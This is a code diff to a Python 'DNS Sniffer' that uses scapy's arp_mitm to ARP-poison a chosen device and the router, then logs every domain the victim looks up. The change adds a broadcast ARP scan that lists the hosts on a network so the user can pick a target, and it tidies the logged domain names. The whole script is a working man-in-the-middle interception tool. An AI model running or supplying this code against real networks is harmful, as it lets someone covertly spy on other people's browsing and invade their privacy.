@@ -2,17 +2,26 @@ import argparse
 import threading
 from colorama import Fore, Style
 from time import strftime, localtime, sleep
-from scapy.layers.l2 import arp_mitm, ARP
+from scapy.layers.l2 import arp_mitm, ARP, Ether
 from scapy.layers.dns import DNS
-from scapy.sendrecv import sniff
+from scapy.sendrecv import sniff, srp
 
 
 parser = argparse.ArgumentParser(description='DNS Sniffer')
-parser.add_argument('--targetip', help='Target device you want to watch.', required=True)
+parser.add_argument('--network', help='Network to scan (eg. "10.255.73.0/24").', required=True)
 parser.add_argument('--iface', help='Interface to use for attack', required=True)
 parser.add_argument('--routerip', help='IP of your home router', required=True)
 
 opts = parser.parse_args()
+
+
+def arp_scan(network, iface):
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=5, iface=iface)
+    print(f'{Fore.RED}########## NETWORK DEVICES ##########{Style.RESET_ALL}\n')
+    for i in ans:
+        ip = i.answer[ARP].psrc
+        print(f'{Fore.BLUE}{ip}{Style.RESET_ALL}')
+    return input('\nPick a device IP: ')
 
 
 class Device:
@@ -35,7 +44,7 @@ class Device:
               filter=f'src host {self.targetip} and udp port 53')
 
     def dns(self, pkt):
-        record = pkt[DNS].qd.qname.decode('utf-8') #.strip('.')
+        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
         time = strftime("%d/%m/%Y %H:%M:%S", localtime())
         print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')
 
@@ -47,5 +56,6 @@ class Device:
         t2.start()
 
 if __name__ == '__main__':
-    device = Device(opts.routerip, opts.targetip, opts.iface)
+    targetip = arp_scan(opts.network, opts.iface)
+    device = Device(opts.routerip, targetip, opts.iface)
     device.watch()
